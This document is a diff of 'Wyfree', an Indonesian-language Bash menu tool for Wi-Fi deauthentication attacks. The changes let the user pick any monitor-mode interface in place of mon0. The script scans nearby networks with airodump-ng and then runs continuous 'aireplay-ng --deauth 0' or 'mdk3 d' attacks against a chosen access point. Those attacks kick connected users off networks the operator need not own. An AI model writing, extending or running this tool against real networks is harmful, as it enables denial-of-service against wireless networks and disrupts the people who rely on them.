@@ -100,28 +100,37 @@ animasi() {
 keluar() {
 	judul
   echo -e "${Color_Off}[${Red}-${Color_Off}] ${BWhite}Memulai ${Color_Off}bersih-bersih"
-  if test -d /sys/class/net/mon0 ;then
-    if ! cfg_read $pengaturan simpan | grep -q "true" ;then
-      iw mon0 del
-      echo -e "${Color_Off}[${Red}-${Color_Off}] Interface ${BWhite}mon0 ${Red}dihapus${Color_Off}"
-    else
-      echo -e "${Color_Off}[${Green}+${Color_Off}] Interface ${BWhite}mon0 ${Green}tidak dihapus${Color_Off}"
+  sleep 0.025
+  if ! [[ -z $(echo $mon_terpilih) ]] ;then
+    if test -d /sys/class/net/$mon_terpilih ;then
+      if ! cfg_read $pengaturan simpan | grep -q "true" ;then
+        iw $mon_terpilih del
+        echo -e "${Color_Off}[${Red}-${Color_Off}] Interface ${BWhite}$mon_terpilih ${Red}dihapus${Color_Off}"
+        sleep 0.025
+      else
+        echo -e "${Color_Off}[${Green}+${Color_Off}] Interface ${BWhite}$mon_terpilih ${Green}tidak dihapus${Color_Off}"
+        sleep 0.025
+      fi
     fi
   fi
-  if test -e $HOME/.wyfree/airdump-01.csv ;then
-    rm $HOME/.wyfree/airdump*
+  if test -e $HOME/.wyfree/*.csv ;then
+    rm $HOME/.wyfree/*.csv
     echo -e "${Color_Off}[${Red}-${Color_Off}] File ${BWhite}airdump ${Red}dihapus${Color_Off}"
+    sleep 0.025
   fi
   if test -e $HOME/.wyfree/bssid.txt ;then
     rm $HOME/.wyfree/bssid.txt
     echo -e "${Color_Off}[${Red}-${Color_Off}] File ${BWhite}BSSID ${Red}dihapus${Color_Off}"
+    sleep 0.025
   fi
   if test -e $HOME/.wyfree/essid.txt ;then
     rm $HOME/.wyfree/essid.txt
     echo -e "${Color_Off}[${Red}-${Color_Off}] File ${BWhite}ESSID ${Red}dihapus${Color_Off}"
+    sleep 0.025
   fi
   echo -e "${Color_Off}[${Green}+${Color_Off}] Bersih-bersih${BWhite} selesai"
-	echo -e -n "${Color_Off}[${Green}+${Color_Off}] Terimakasih telah menggunakan ${IBlue}Wyfree${Green}" && sleep 1.5 &
+  sleep 0.025
+	echo -e -n "${Color_Off}[${Green}+${Color_Off}] Terimakasih telah menggunakan ${IBlue}Wyfree${Green}" && sleep 3 &
 	animasi "$!"
 	clear
 	exit
@@ -140,12 +149,12 @@ judul() {
 #Cek Persyaratan
 syarat() {
   echo -e -n "${Color_Off}[${Yellow}#${Color_Off}] adaptor wireless."
-	 if test -d /sys/class/net/wlan* ;then
-     echo -e "${IGreen}Ada"
-   else
-     echo -e "${Red}Tidak Ada"
-     persyaratan=true
-   fi
+  if ! [[ -z $(iwconfig 2>/dev/null) ]] ;then
+    echo -e "${IGreen}Ada"
+  else
+    echo -e "${Red}Tidak Ada"
+    persyaratan=true
+  fi
   sleep 0.025
   echo -e -n "${Color_Off}[${Yellow}#${Color_Off}] iw..............."
 	if ! hash iw 2>/dev/null;then
@@ -196,9 +205,9 @@ syarat() {
 	fi
 	sleep 0.025
 	if $persyaratan ;then
-    echo -e -n "${Color_Off}[${Red}#${Color_Off}] Error Loading...${Red}"&& sleep 1.5 &
+    echo -e -n "${Color_Off}[${Red}#${Color_Off}] Error Loading...${Red}"&& sleep 3 &
     animasi "$!"
-		keluar
+		exit
 	fi
 }
 #Config
@@ -206,7 +215,7 @@ if ! test -d $HOME/.wyfree;then
 	mkdir $HOME/.wyfree
 fi
 if ! test -e $pengaturan;then
-	echo -e -n "mode = whitelist\nsimpan = false" > $pengaturan
+	echo -e -n "mode = whitelist\nsimpan = true" > $pengaturan
 fi
 sed_escape() {
   sed -e 's/[]\/$*.^[]/\\&/g'
@@ -226,7 +235,7 @@ cfg_haskey() { # path, key
 }
 judul
 syarat
-echo -e -n "${Color_Off}[${Green}#${Color_Off}] Loading Wyfree..${IGreen}"&& sleep 1.5 &
+echo -e -n "${Color_Off}[${Green}#${Color_Off}] Loading Wyfree..${IGreen}"&& sleep 2 &
 animasi "$!"
 ##Membuat file whitelist dan me-whitelist MAC address kamu
 if ! test -e  $HOME/.wyfree/whitelist.txt;then
@@ -241,9 +250,9 @@ fi
 menuutama() {
 	judul
 	sleep 0.025 && echo -e "${White}1. ${IBlue}Tendang"
-	sleep 0.025 && echo -e "${White}2. ${IBlue}Buat Interface mon0"
-	sleep 0.025 && echo -e "${White}3. ${IBlue}Cek Interface mon0"
-	sleep 0.025 && echo -e "${White}4. ${IBlue}Hapus Interface mon0"
+	sleep 0.025 && echo -e "${White}2. ${IBlue}Tentukan interface monitor"
+	sleep 0.025 && echo -e "${White}3. ${IBlue}Cek interface monitor"
+	sleep 0.025 && echo -e "${White}4. ${IBlue}Hapus interface monitor"
 	sleep 0.025 && echo -e "${White}9. ${IBlue}Pengaturan"
 	sleep 0.025 && echo -e "${White}0. ${Red}Exit"
 	echo -e -n "${Red}[${IBlue}Wyfree${Yellow}@${White}$(hostname)${Red}]-[${Yellow}~${Red}] ${White}"& read respon
@@ -251,26 +260,26 @@ menuutama() {
 }
 #Function Untuk Menu Utama
 nomor1() {
-	if test -d /sys/class/net/mon0 ;then
-    judul
-		sleep 0.025 && echo -e "${White}Pilih tool yang ingin digunakan:"
-		sleep 0.025 && echo -e "${White}1. ${IBlue}Aireplay-ng"
-		sleep 0.025 && echo -e "${White}2. ${IBlue}Mdk3"
-		sleep 0.025 && echo -e "${White}0. ${Red}Kembali ke menu utama"
-		echo -e -n "${Red}[${IBlue}Wyfree${Yellow}@${White}${hostname}${Red}]-[${Yellow}~${Red}] ${White}"& read jawab
-		if [ $jawab == 1 ] ;then
-			nomor11
-		elif [ $jawab == 2 ] ;then
-			nomor12
-		elif [ $jawab == 0 ] ;then
-			menuutama
-		else
-			nomor1
-		fi
+	if [[ -z $mon_terpilih ]] ;then
+    echo -e -n "${White}Interface monitor belum ditentukan${Red}"&& sleep 2 &
+    animasi "$!"
+    menuutama
 	else
-		echo -e -n "${White}Interface mon0 tidak ditemukan, silahkan buat dulu ${Red}"&& sleep 1.5 &
-		animasi "$!"
-		menuutama
+    judul
+    sleep 0.025 && echo -e "${White}Pilih tool yang ingin digunakan:"
+    sleep 0.025 && echo -e "${White}1. ${IBlue}Aireplay-ng"
+    sleep 0.025 && echo -e "${White}2. ${IBlue}Mdk3"
+    sleep 0.025 && echo -e "${White}0. ${Red}Kembali ke menu utama"
+    echo -e -n "${Red}[${IBlue}Wyfree${Yellow}@${White}${hostname}${Red}]-[${Yellow}~${Red}] ${White}"& read jawab
+    if [ $jawab == 1 ] ;then
+      nomor11
+    elif [ $jawab == 2 ] ;then
+      nomor12
+    elif [ $jawab == 0 ] ;then
+      menuutama
+    else
+      nomor1
+    fi
 	fi
 }
 nomor11() {
@@ -292,7 +301,7 @@ nomor11() {
   airdump
 }
 airdump() {
-  xterm -geometry 108x24 -T "Tutup window ini jika wifi target anda sudah muncul" -e "airodump-ng -w $HOME/.wyfree/airdump --output-format csv mon0"
+  xterm -geometry 108x24 -T "Tutup window ini jika wifi target anda sudah muncul" -e "airodump-ng -w $HOME/.wyfree/airdump --output-format csv $mon_terpilih"
   awk -F "\"*,\"*" '{print $1}' $HOME/.wyfree/airdump-01.csv | sed -n -e '/BSSID/,/Station/ p' | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' > $HOME/.wyfree/bssid.txt
   awk -F "\"*,\"*" '{print $14}' $HOME/.wyfree/airdump-01.csv | sed 's/\<ESSID\>//g' | awk 'NF' > $HOME/.wyfree/essid.txt
   jumlah=$(wc -l $HOME/.wyfree/bssid.txt | grep -o '[0-9]*')
@@ -353,9 +362,9 @@ choosemac() {
   re='^[0-9]+$'
   if [[ $jawab =~ $re ]] ;then
     if [[ $jawab -le $jumlah && $jawab -gt 0 ]] ;then
-      xterm -T "Aireplay-ng" -e "aireplay-ng --deauth 0 -a ${bssid[$jawab-1]} --ignore-negative-one mon0"
+      xterm -T "Aireplay-ng" -e "aireplay-ng --deauth 0 -a ${bssid[$jawab-1]} --ignore-negative-one $mon_terpilih"
       judul
-      echo -e -n "${White}Selesai Menendang ${IGreen}" && sleep 1.5 &
+      echo -e -n "${White}Selesai Menendang ${IGreen}" && sleep 2 &
     	animasi "$!"
     	menuutama
     elif [[ $jawab == "99" ]] ;then
@@ -374,60 +383,152 @@ nomor12() {
   wb=$(cat $pengaturan | grep "mode" | awk '{print $3}')
 	judul
 	echo -e "${White}Kamu memilih tool mdk3. Tool ini akan di jalankan"
-	echo -e "${White}dalam mode ${wb}, anda bisa mengubah modenya di"
+	echo -e "${White}dalam mode ${wb}, kamu bisa mengubah modenya di"
 	echo -e -n "pengaturan. Tekan enter untuk melanjutkan" & read enter
 	judul
 	echo -e "${White}Bersiap Menendang..."
 	sleep 1
 	judul
-	echo -e "${Red}Sedang Menendang..." && xterm -T "mdk3 mode ${wb}" -e "mdk3 mon0 d -w $HOME/.wyfree/${wb}.txt"
+	echo -e "${Red}Sedang Menendang..." && xterm -T "mdk3 mode ${wb}" -e "mdk3 $mon_terpilih d -w $HOME/.wyfree/${wb}.txt"
   judul
-	echo -e -n "${White}Selesai Menendang ${IGreen}" && sleep 1.5 &
+	echo -e -n "${White}Selesai Menendang ${IGreen}" && sleep 2 &
 	animasi "$!"
 	menuutama
 }
 nomor2() {
-  echo "Checking interface mon0..."
-  sleep 1
-	if test -d /sys/class/net/mon0 ;then
-    sleep 0.025
-	  echo -e -n "${White}Interface mon0 sudah ada ${IYellow}"&& sleep 1.5 &
-		animasi "$!"
-		menuutama
-	else echo "Membuat interface mon0..."
-	  iw wlan0 interface add mon0 type monitor
-		ifconfig mon0 down
-		iwconfig mon0 mode monitor
-		ifconfig mon0 up
-    sleep 0.025
-		echo -e -n "${White}Interface mon0 berhasil di buat ${IGreen}"&& sleep 1.5 &
-		animasi "$!"
-		menuutama
+	if iwconfig 2>/dev/null | grep -q "Monitor" ;then
+    scan_mon
+	else
+    scan_interface
 	fi
 }
+scan_mon() {
+  daftar_mon=()
+  for interface in $(iwconfig 2>/dev/null | grep "Monitor" | cut -d ' ' -f1| awk NF)
+  do
+    daftar_mon+=("$interface")
+  done
+  pilih_mon
+}
+pilih_mon() {
+  judul
+  echo -e "${White}Pilih interface yang ingin digunakan..."
+  echo -e "${IBlue}No. Interface"
+  for ((i=1; i<=${#daftar_mon[@]}; i++))
+  do
+    if [[ $i -lt 10 ]] ;then
+      echo -e "${White}0$i. ${daftar_mon[$i-1]}"
+    else
+      echo -e "${White}$i. ${daftar_mon[$i-1]}"
+    fi
+  done
+  echo -e "${Yellow}98. Buat interface monitor baru"
+  echo -e "${Yellow}99. Re-scan"
+  echo -e "${Red}00. Kembali ke menu utama"
+  echo -e -n "${Red}[${IBlue}Wyfree${Yellow}@${White}${hostname}${Red}]-[${Yellow}~${Red}] ${White}"& read jawab
+  re='^[0-9]+$'
+  if [[ $jawab =~ $re ]] ;then
+    if [[ $jawab -le ${#daftar_mon[@]} && $jawab -gt 0 ]] ;then
+      echo -e -n "${White}Interface monitor ${Red}${daftar_mon[$answer-1]}${White} telah dipilih!${IGreen}" && sleep 2 &
+      animasi "$!"
+      mon_terpilih=${daftar_mon[$jawab-1]}
+      menuutama
+    elif [[ $jawab == 98 ]] ;then
+      scan_interface
+    elif [[ $jawab == 99 ]] ;then
+      nomor2
+    elif [[ $jawab == 00 ]] ;then
+      menuutama
+    else
+      pilih_mon
+    fi
+  else
+    pilih_mon
+  fi
+}
+scan_interface() {
+  daftar_interface=()
+  for interface in $(iwconfig 2>/dev/null | cut -d ' ' -f1| awk NF)
+  do
+    if ! iwconfig $interface | grep -q "Monitor" ;then
+      daftar_interface+=("$interface")
+    fi
+  done
+  pilih_interface
+}
+pilih_interface() {
+  judul
+  echo -e "${White}Pilih interface yang ingin digunakan..."
+  echo -e "${IBlue}No. Interface"
+  for ((i=1; i<=${#daftar_interface[@]}; i++))
+  do
+    if [[ $i -lt 10 ]] ;then
+      echo -e "${White}0$i. ${daftar_interface[$i-1]}"
+    else
+      echo -e "${White}$i. ${daftar_interface[$i-1]}"
+    fi
+  done
+  if iwconfig 2>/dev/null | grep -q "Monitor" ;then
+    m0n=true
+    echo -e "${Yellow}98. Gunakan interface monitor yang sudah ada"
+  fi
+  echo -e "${Yellow}99. Re-scan"
+  echo -e "${Red}00. Kembali ke menu utama"
+  echo -e -n "${Red}[${IBlue}Wyfree${Yellow}@${White}${hostname}${Red}]-[${Yellow}~${Red}] ${White}"& read jawab
+  re='^[0-9]+$'
+  if [[ $jawab =~ $re ]] ;then
+    if [[ $jawab -le ${#daftar_interface[@]} && $jawab -gt 0 ]] ;then
+      echo -e "${White}Interface ${Red}${daftar_interface[$answer-1]}${White} telah dipilih!"
+      sleep 2
+      interface_terpilih=${daftar_interface[$jawab-1]}
+      addmon
+    elif [[ $jawab == 98 ]] ;then
+      if $m0n ;then
+        scan_mon
+      else
+        pilih_interface
+      fi
+    elif [[ $jawab == 99 ]] ;then
+      nomor2
+    elif [[ $jawab == 00 ]] ;then
+      menuutama
+    else
+      pilih_interface
+    fi
+  else
+    pilih_interface
+  fi
+}
+addmon() {
+  iw $interface_terpilih interface add ${interface_terpilih}mon type monitor
+  mon_terpilih="${interface_terpilih}mon"
+  echo -e -n "${White}Interface monitor ${Red}${mon_terpilih}${White} berhasil dibuat${IGreen}" && sleep 2 &
+  animasi "$!"
+  menuutama
+}
 nomor3() {
-  echo "Checking interface mon0..."
-	 sleep 1
-	 if test -d /sys/class/net/mon0 ;then
-     echo -e -n "${White}Interface mon0 sudah ada dan siap di gunakan ${IGreen}"&& sleep 1.5 &
-     animasi "$!"
-     menuutama
-	 else
-     echo -e -n "${White}Interface mon0 tidak ditemukan ${Red}"&& sleep 1.5 &
-     animasi "$!"
-     menuutama
-   fi
+  echo "Checking interface monitor..."
+	sleep 1
+  if [[ -z $mon_terpilih ]] ;then
+    echo -e -n "${White}Interface monitor belum ditentukan${Red}"&& sleep 2 &
+    animasi "$!"
+    menuutama
+ else
+    echo -e -n "${White}Interface monitor ${Red}$mon_terpilih${White} siap digunakan${IGreen}"&& sleep 2 &
+    animasi "$!"
+    menuutama
+ fi
 }
 nomor4() {
-  echo "Checking interface mon0..."
+  echo "Checking interface monitor..."
   sleep 1
-  if test -d /sys/class/net/mon0 ;then
-    iw mon0 del
-    echo -e -n "${White}Interface mon0 berhasil dihapus ${IGreen}"&& sleep 1.5 &
+  if [[ -z $mon_terpilih ]] ;then
+    echo -e -n "${White}Interface monitor belum ditentukan${Red}"&& sleep 2 &
     animasi "$!"
     menuutama
   else
-    echo -e -n "${White}Interface mon0 tidak ditemukan ${Red}"&& sleep 1.5 &
+    iw $mon_terpilih del
+    echo -e -n "${White}Interface $mon_terpilih berhasil dihapus${IGreen}"&& sleep 2 &
     animasi "$!"
     menuutama
   fi
@@ -435,7 +536,7 @@ nomor4() {
 nomor9() {
   judul
   sleep 0.025 && echo -e "${White}Apa yang ingin kamu ubah?"
-  sleep 0.025 && echo -e "${White}1.${IBlue}Simpan interface mon0 ketika keluar?"
+  sleep 0.025 && echo -e "${White}1.${IBlue}Simpan interface monitor ketika keluar?"
   sleep 0.025 && echo -e "${White}2.${IBlue}Mode mdk3"
   sleep 0.025 && echo -e "${White}3.${IBlue}Edit File Whitelist"
   sleep 0.025 && echo -e "${White}4.${IBlue}Edit File Blacklist"
@@ -464,7 +565,7 @@ nomor91() {
     ada="${Red}dihapus"
     gada="${IGreen}disimpan"
   fi
-  sleep 0.025 && echo -e "${White}Saat ini interface mon0 akan ${ada} ${White}ketika keluar"
+  sleep 0.025 && echo -e "${White}Saat ini interface monitor akan ${ada} ${White}ketika keluar"
   sleep 0.025 && echo -e "${White}Ubah menjadi ${gada} ${White}ketika keluar?(ya/tidak)"
   echo -e -n "${Red}[${IBlue}Wyfree${Yellow}@${White}${hostname}${Red}]-[${Yellow}~${Red}] ${White}"& read yatidak
   if [[ $yatidak == "ya" ]] ;then
@@ -473,11 +574,11 @@ nomor91() {
     else
       cfg_write $pengaturan simpan false
     fi
-    echo -e -n ${White}Interface mon0 akan ${gada} ${White}ketika keluar ${IGreen}&& sleep 1.5 &
+    echo -e -n ${White}Interface monitor akan ${gada} ${White}ketika keluar ${IGreen}&& sleep 2 &
     animasi "$!"
     nomor9
   elif [[ $yatidak == "tidak" ]] ;then
-    echo -e -n ${White}Interface mon0 akan ${ada} ${White}ketika keluar ${Red}&& sleep 1.5 &
+    echo -e -n ${White}Interface monitor akan ${ada} ${White}ketika keluar ${Red}&& sleep 2 &
     animasi "$!"
     nomor9
   else
@@ -501,11 +602,11 @@ nomor92() {
   echo -e -n "${Red}[${IBlue}Wyfree${Yellow}@${White}${hostname}${Red}]-[${Yellow}~${Red}] ${White}"& read yatidak
   if [ $yatidak == "ya" ] ;then
     cfg_write $pengaturan mode $kebalikan
-    echo -e -n "${White}Berhasil di ubah menjadi mode ${kebalikan}${IGreen}" && sleep 1.5 &
+    echo -e -n "${White}Berhasil di ubah menjadi mode ${kebalikan}${IGreen}" && sleep 2 &
     animasi "$!"
     nomor9
   elif [ $yatidak == "tidak" ] ;then
-    echo -e -n "${White}mdk3 akan tetap dijalankan pada mode ${wb}${red}" && sleep 1.5 &
+    echo -e -n "${White}mdk3 akan tetap dijalankan pada mode ${wb}${red}" && sleep 2 &
     animasi "$!"
     nomor9
   else
